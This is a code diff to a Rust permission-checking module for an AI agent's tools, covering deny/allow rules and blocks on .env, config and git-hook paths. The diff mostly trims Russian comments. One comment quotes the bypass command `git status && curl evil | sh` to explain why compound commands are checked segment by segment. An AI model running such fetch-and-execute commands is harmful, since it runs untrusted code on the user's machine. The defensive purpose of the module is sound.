@@ -34,9 +34,9 @@ pub struct PermState {
     pub roots_canon: Vec<String>,
     /// true после первого perm_set: фронт синхронизировал режим задачи
     pub synced: bool,
-    /// Волна E1: персистентные правила (perm_set валидирует fail-closed)
+    /// персистентные правила (perm_set валидирует fail-closed)
     pub rules: PermRules,
-    /// Волна E3: канонизованный app-config каталог — самозащита конфига
+    /// канонизованный app-config каталог — самозащита конфига
     pub config_dir: Option<String>,
 }
 
@@ -67,7 +67,7 @@ pub(crate) fn set(state: PermState) {
     *g = Some(state);
 }
 
-/// Персистентные правила прав (волна E1). deny — серверный блок во всех
+/// Персистентные правила прав. deny — серверный блок во всех
 /// режимах; allow/always_ask — политика ПОДТВЕРЖДЕНИЙ фронта: бекенд их
 /// не исполняет (он не может отличить «юзер подтвердил» от «фронт забыл
 /// спросить» — как и в Ask-режиме), и правила не пробивают жёсткие границы
@@ -136,7 +136,7 @@ pub fn parse_rule(rule: &str) -> Option<ParsedRule> {
 }
 
 /// Валидация правила (fail-closed: perm_set отвергает битое — защита
-/// «not synchronized» держит мутации, пока владелец не починит список).
+/// «not synchronized» держит мутации, пока пользователь не починит список).
 /// known — реестр builtin-имён (tooling::known_tool_names).
 /// for_allow — правило попадает в allow-список: там bare-форма на
 /// shell_run/fs_* запрещена («allow shell_run» = Full через боковую дверь,
@@ -174,8 +174,7 @@ pub fn validate_rule(
     Ok(())
 }
 
-/// Канонизованная нормализованная форма для матчинга правил (заметка
-/// владельца №1): 8.3-алиасы, регистр и разделители разворачивает
+/// Канонизованная нормализованная форма для матчинга правил: 8.3-алиасы, регистр и разделители разворачивает
 /// canonicalize, сырой вход в матчинг не попадает никогда
 fn canon_norm(path: &str) -> String {
     match canonicalize_for_compare(std::path::Path::new(path)) {
@@ -184,7 +183,7 @@ fn canon_norm(path: &str) -> String {
     }
 }
 
-/// Обёртка для perm_set: канонизация config-каталога самозащиты (волна E3)
+/// Обёртка для perm_set: канонизация config-каталога самозащиты
 pub(crate) fn norm_canonical_path(path: &str) -> String {
     canon_norm(path)
 }
@@ -251,7 +250,7 @@ fn shell_segments(cmd: &str) -> Vec<String> {
         .collect()
 }
 
-/// Матчинг правил по СОСТАВНОЙ команде (аудит perm 353–354: префикс
+/// Матчинг правил по СОСТАВНОЙ команде (префикс
 /// `shell_run(git *)` молча покрывал `git status && curl evil | sh`).
 /// deny = совпадение ЛЮБОГО сегмента (cd /tmp && rm не проскочит),
 /// allow = совпадение ВСЕХ сегментов — составная команда не получает
@@ -310,8 +309,8 @@ pub(crate) fn decide(state: &PermState, name: &str, path: Option<&str>) -> Resul
         | "gguf_cut" | "gguf_test" => true,
         // memory_save НЕ mutating: «ИИ сам делает слепки» — проактивные
         // сохранения в Ask-режиме заваливали пользователя подтверждениями.
-        // Запись — в локальный memory.json под потолками и фильтром секретов
-        // (аудит memory 307); Plan по-прежнему запрещает (нет в PLAN_READ_ONLY)
+        // Запись — в локальный memory.json под потолками и фильтром секретов;
+        // Plan-режим всё равно запрещает (нет в PLAN_READ_ONLY)
         n if n.starts_with("mcp__") => true,
         // Чтение и скриншот безопасны — mutating только действия
         n if n.starts_with("browser_") => !matches!(n, "browser_read" | "browser_screenshot"),
@@ -325,9 +324,9 @@ pub(crate) fn decide(state: &PermState, name: &str, path: Option<&str>) -> Resul
         name,
         "fs_read" | "fs_list" | "fs_write" | "fs_delete" | "fs_grep" | "diagnostics"
     );
-    // Волна E1: deny-правило — серверный блок во всех режимах, на любой
+    // Deny-правило — серверный блок во всех режимах, на любой
     // инструмент (включая чтения), до остальных гейтов. fs-аргумент матчится
-    // ТОЛЬКО по канонизованной форме (заметка владельца №1)
+    // ТОЛЬКО по канонизованной форме
     let rule_arg: Option<String> = if fs_tool {
         path.map(canon_norm)
     } else {
@@ -369,7 +368,7 @@ pub(crate) fn decide(state: &PermState, name: &str, path: Option<&str>) -> Resul
         // План: любые мутации блокируются (включая мышь/клавиатуру и MCP),
         // fs-чтение — с path-контролем, остальное чтение — только из явного
         // read-only списка. Раньше «неизвестный инструмент» классифицировался
-        // как чтение и проходил Plan целиком (аудит perm 349)
+        // как чтение и проходил Plan целиком
         PermMode::Plan => {
             if mutating {
                 return Err(format!("blocked by permission mode: plan (tool {name})"));
@@ -430,9 +429,9 @@ pub(crate) fn decide(state: &PermState, name: &str, path: Option<&str>) -> Resul
 }
 
 /// Path-контроль для fs_* инструментов (сюда доходим без ранних Err/Ok).
-/// Волна E3: БЕЗУСЛОВНЫЕ гейты (config-каталог, .env-бэкстоп, sensitive-класс)
-/// стоят ДО корней и правил — config вообще без escape (заметка владельца
-/// №2), sensitive/.env — escape только явным allow-правилом владельца; и
+/// БЕЗУСЛОВНЫЕ гейты (config-каталог, .env-бэкстоп, sensitive-класс)
+/// стоят ДО корней и правил — config вообще без escape,
+/// sensitive/.env — escape только явным allow-правилом; и
 /// работают при пустых roots тоже (path-контроль корней при этом off)
 fn check_fs_path(state: &PermState, name: &str, path: Option<&str>) -> Result<(), String> {
     let Some(p) = path else {
@@ -463,7 +462,7 @@ fn check_fs_path(state: &PermState, name: &str, path: Option<&str>) -> Result<()
         }
     }
 
-    // 2) .env-бэкстоп (заметка владельца №3): raw-подстрока case-insensitive —
+    // 2) .env-бэкстоп: raw-подстрока case-insensitive —
     // грубая сеть поверх канонического матчинга, ловит .env.local/.ENV/…
     // False positive (app.env.backup) уводится явным allow-правилом
     if matches!(name, "fs_read" | "fs_write" | "fs_delete" | "fs_grep")
@@ -508,9 +507,9 @@ pub fn recheck_location(name: &str, verified: &std::path::Path) -> Result<(), St
 
 /// Чувствительный класс путей (по канонизованной нормализованной форме):
 /// чтение = утечка секретов, запись = подмена — класс один для fs_*.
-/// Вердикт владельца: DENY по умолчанию, escape — явное allow-правило.
+/// DENY по умолчанию, escape — явное allow-правило.
 /// pub(crate): тот же класс переиспользует files.rs для чекпоинт-снапшотов
-/// (секреты не уезжают в снимок и не возвращаются из него — аудит A1-4)
+/// (секреты не уезжают в снимок и не возвращаются из него)
 pub(crate) fn is_sensitive_path(canon: &str) -> bool {
     let sep = if cfg!(windows) { '\\' } else { '/' };
     let comps: Vec<&str> = canon.split(sep).filter(|c| !c.is_empty()).collect();
@@ -529,7 +528,7 @@ pub(crate) fn is_sensitive_path(canon: &str) -> bool {
     }
     // .git/hooks/*: pre-commit и прочие хуки исполняются при любом git
     // commit (в т.ч. git_autocommit в files.rs) — запись в Edit-режиме даёт
-    // выполнение кода с правами пользователя (аудит perm 355)
+    // выполнение кода с правами пользователя
     if comps.contains(&".git") && comps.contains(&"hooks") {
         return true;
     }
@@ -930,7 +929,7 @@ mod tests {
         assert!(decide(&state(PermMode::Full, &["C:\\proj"]), "browser_read", None).is_ok());
     }
 
-    // ---------- правила (волна E1) ----------
+    // ---------- правила ----------
 
     #[test]
     fn deny_rule_blocks_all_modes_and_reads() {
@@ -1014,7 +1013,7 @@ mod tests {
         assert!(validate_rule("web_search(x*y)", false, &known).is_err());
     }
 
-    // ---------- чувствительные пути и самозащита (волна E3) ----------
+    // ---------- чувствительные пути и самозащита ----------
 
     // Тест гоняет Windows-пути (C:\, канонизация \?\) — на unix семантика другая,
     // unix-поведение покрывают *_unix-тесты ниже
@@ -1046,7 +1045,7 @@ mod tests {
         // raw-подстрока .env ловит регистр и вариации без канонизации
         assert!(decide(&st, "fs_read", Some("C:\\proj\\.ENV")).is_err());
         assert!(decide(&st, "fs_grep", Some("C:\\proj\\.env.local")).is_err());
-        // false positive уводится явным allow-правилом владельца
+        // false positive уводится явным allow-правилом
         let mut st2 = state(PermMode::Full, &["C:\\proj"]);
         st2.rules.allow = vec!["fs_read(C:\\proj\\app.env.backup)".into()];
         assert!(decide(&st2, "fs_read", Some("C:\\proj\\app.env.backup")).is_ok());
@@ -1074,7 +1073,7 @@ mod tests {
     fn config_dir_gate_unconditional_and_first() {
         let mut st = state(PermMode::Full, &["C:\\Users\\me\\AppData\\Roaming"]);
         st.config_dir = Some("c:\\users\\me\\appdata\\roaming\\com.haloui.app".to_string());
-        // даже allow-правило владельца НЕ перекрывает самозащиту конфига
+        // даже allow-правило НЕ перекрывает самозащиту конфига
         st.rules.allow = vec![
             "fs_write(C:\\Users\\me\\AppData\\Roaming\\com.haloui.app\\hooks.json)".into(),
         ];
